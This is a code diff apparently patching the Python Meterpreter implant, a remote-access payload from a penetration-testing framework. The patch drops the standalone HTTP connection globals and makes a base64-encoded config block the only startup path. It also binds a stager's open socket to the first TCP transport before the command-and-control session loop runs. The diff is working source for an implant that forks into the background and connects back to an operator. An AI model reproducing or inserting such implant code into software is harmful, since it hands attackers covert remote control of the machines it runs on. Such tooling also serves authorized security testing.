@@ -62,19 +62,15 @@ random.seed()
 DEBUGGING = False
 DEBUGGING_LOG_FILE_PATH = None
 TRY_TO_FORK = True
-HTTP_CONNECTION_URL = None
-HTTP_PROXY = None
-HTTP_USER_AGENT = None
-HTTP_COOKIE = None
-HTTP_HOST = None
-HTTP_REFERER = None
+CONFIG_BLOCK = ''
+
+# defaults used as fallbacks within transport setup
 PAYLOAD_UUID = ''
 SESSION_GUID = ''
 SESSION_COMMUNICATION_TIMEOUT = 300
 SESSION_EXPIRATION_TIMEOUT = 604800
 SESSION_RETRY_TOTAL = 3600
 SESSION_RETRY_WAIT = 10
-CONFIG_BLOCK = ''
 
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
@@ -946,7 +942,7 @@ class Transport(object):
             transport = TcpTransport(url)
         elif url.startswith('http'):
             proxy = packet_get_tlv(request, TLV_TYPE_C2_PROXY_URL).get('value')
-            user_agent = packet_get_tlv(request, TLV_TYPE_C2_UA).get('value', HTTP_USER_AGENT)
+            user_agent = packet_get_tlv(request, TLV_TYPE_C2_UA).get('value')
             http_headers = packet_get_tlv(request, TLV_TYPE_C2_HEADERS).get('value', None)
             transport = HttpTransport(url, proxy=proxy, user_agent=user_agent)
             if http_headers:
@@ -1918,27 +1914,21 @@ if not _try_to_fork or (_try_to_fork and os.fork() == 0):
         except OSError:
             pass
 
-    if CONFIG_BLOCK:
-        config = parse_config_block(base64.b64decode(CONFIG_BLOCK))
-        PAYLOAD_UUID = binascii.b2a_hex(config['uuid']).decode('UTF-8')
-        SESSION_GUID = binascii.b2a_hex(config['session_guid']).decode('UTF-8')
-        if config.get('debug_log'):
-            DEBUGGING = True
-            DEBUGGING_LOG_FILE_PATH = config['debug_log']
-        transport = config['transports'][0]
-        met = PythonMeterpreter(transport)
-        met.session_expiry_time = config['session_expiry']
-        met.session_expiry_end = time.time() + config['session_expiry']
-        for t in config['transports'][1:]:
-            met.transports.append(t)
-    elif HTTP_CONNECTION_URL:
-        if not has_urllib:
-            raise RuntimeError('HTTP transport requested but urllib is not available')
-        transport = HttpTransport(HTTP_CONNECTION_URL, proxy=HTTP_PROXY, user_agent=HTTP_USER_AGENT,
-                http_host=HTTP_HOST, http_referer=HTTP_REFERER, http_cookie=HTTP_COOKIE)
-        met = PythonMeterpreter(transport)
-    else:
-        # PATCH-SETUP-STAGELESS-TCP-SOCKET #
-        transport = TcpTransport.from_socket(s)
-        met = PythonMeterpreter(transport)
+    config = parse_config_block(base64.b64decode(CONFIG_BLOCK))
+    PAYLOAD_UUID = binascii.b2a_hex(config['uuid']).decode('UTF-8')
+    SESSION_GUID = binascii.b2a_hex(config['session_guid']).decode('UTF-8')
+    if config.get('debug_log'):
+        DEBUGGING = True
+        DEBUGGING_LOG_FILE_PATH = config['debug_log']
+    transport = config['transports'][0]
+    # For staged TCP payloads, the stager has already established the socket
+    # connection, so bind it to the first transport instead of reconnecting.
+    if isinstance(transport, TcpTransport) and 's' in globals():
+        transport.socket = s
+    # PATCH-SETUP-STAGELESS-TCP-SOCKET #
+    met = PythonMeterpreter(transport)
+    met.session_expiry_time = config['session_expiry']
+    met.session_expiry_end = time.time() + config['session_expiry']
+    for t in config['transports'][1:]:
+        met.transports.append(t)
     met.run()
